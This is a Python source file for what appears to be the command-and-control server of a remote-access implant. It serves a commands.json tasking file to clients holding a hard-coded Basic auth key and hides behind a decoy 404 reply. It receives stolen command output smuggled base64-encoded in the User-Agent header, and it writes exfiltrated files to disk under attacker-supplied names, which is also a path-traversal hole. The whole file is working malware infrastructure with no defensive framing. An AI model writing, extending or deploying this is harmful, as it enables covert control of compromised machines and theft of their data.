"""
// Copyright 2022 mas0yama
"""
from http.server import *
import base64
import time

class Handler(BaseHTTPRequestHandler):
    def do_AUTHHEAD(self):
        self.send_response(404)
        self.send_header('Content-type', 'application/json')
        self.end_headers()
        self.wfile.write(bytes('{ "bonjour" : "les programmers" }', "utf-8"))


    def do_GET(self):
        if (self.headers.get('Authorization') == "Basic " + str(self.server.getAuthKey())):
            try:

                if self.path.split("/")[1] == "public_storage":
                    response_file = open(
                        f"public_storage/{self.path.split('/')[-1]}", "rb").read()
                    self.send_response(200)
                    if self.path.split("/")[-1] == "commands.json":
                        self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(response_file)
                else:

                    if self.headers.get("User-Agent") != None:
                        if self.headers.get("Accept") == "Output":
                            print("[+] GOT RESPONSE: ")
                            try:
                                print(base64.b64decode(self.headers.get(
                                "User-Agent")).decode('utf-8'))
                                ### windows adhoc
                            except UnicodeDecodeError:
                                print(base64.b64decode(self.headers.get(
                                "User-Agent")).decode('imb850'))
                            print("[+]", time.ctime(), "\n")
                        if self.headers.get("Accept").split("/")[0] == "File":
                            with open(self.headers.get("Accept").split("/")[1], "wb") as out:
                                out.write(base64.b64decode(
                                    self.headers.get("User-Agent")))

                    self.send_response(200)
                    self.send_header("Content-type", "application/json")
                    self.end_headers()
                    self.wfile.write(b'{"data" : ""}')
            except Exception as e:
                print(e)
        else:
            self.do_AUTHHEAD()


    def log_message(self, format, *args):
        with open("server_log.log", "a") as file:
            file.write("%s - - [%s] %s\n" %
                       (self.address_string(),
                        self.log_date_time_string(),
                        format % args))


class Server(HTTPServer):
    def __init__(self, server_address:  tuple[str, int], RequestHandlerClass, bind_and_activate=...) -> None:
        super().__init__(server_address, RequestHandlerClass, bind_and_activate)
        self.auth_key = "QWERTY=="
    def getAuthKey(self):
        return self.auth_key


if __name__ == "__main__":

    print("\n\n")
    server = Server(('', 8000), Handler)
    print("Starting server %")
    server.serve_forever()
    server.server_close()
